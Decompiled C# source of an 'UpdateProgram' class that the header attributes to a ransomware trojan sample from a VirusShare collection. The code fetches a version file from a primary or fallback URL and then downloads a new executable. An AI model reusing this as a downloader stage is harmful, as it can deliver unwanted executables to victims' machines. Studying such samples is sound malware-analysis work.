// Decompiled with JetBrains decompiler
// Type: UpdateProgram
// Assembly: Handyware, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 79A15AC7-DE29-40AC-9E7A-1719C725BB8B
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.dizu-68e906811b2a0a3f0f264be4966fee8440ac83cc6a06bae2c47bdbf43e5284bc.exe

using System;
using System.IO;
using System.Net;

internal class UpdateProgram
{
  private string Url;
  private string UrlAlternative;
  private string WorkspacePath;
  private string CurrentVersion;

  public UpdateProgram(
    string DownloadUrl,
    string urlAlternative,
    string Workspace_Path,
    string ProgramCurrentVersion)
  {
    this.Url = DownloadUrl;
    this.WorkspacePath = Workspace_Path;
    this.CurrentVersion = ProgramCurrentVersion;
    this.UrlAlternative = urlAlternative;
  }

  private void DownloadFile(string Url, string SavePath) => new WebClient().DownloadFile(new Uri(Url), SavePath);

  public bool Update()
  {
    try
    {
      System.IO.File.Delete(this.WorkspacePath + "\\update_info.txt");
      try
      {
        this.DownloadFile(this.Url, this.WorkspacePath + "\\update_info.txt");
      }
      catch
      {
        System.IO.File.Delete(this.WorkspacePath + "\\update_info.txt");
        this.DownloadFile(this.UrlAlternative, this.WorkspacePath + "\\update_info.txt");
      }
      StreamReader streamReader = new StreamReader(this.WorkspacePath + "\\update_info.txt");
      string str = streamReader.ReadLine();
      string Url = streamReader.ReadLine();
      streamReader.Close();
      System.IO.File.Delete(this.WorkspacePath + "\\update_info.txt");
      if (!(str != this.CurrentVersion) || Url.Length <= 0)
        return false;
      System.IO.File.Delete(this.WorkspacePath + "\\handyware_newversion.exe");
      this.DownloadFile(Url, this.WorkspacePath + "\\handyware_newversion.exe");
      return true;
    }
    catch (SystemException ex)
    {
      return false;
    }
  }
}
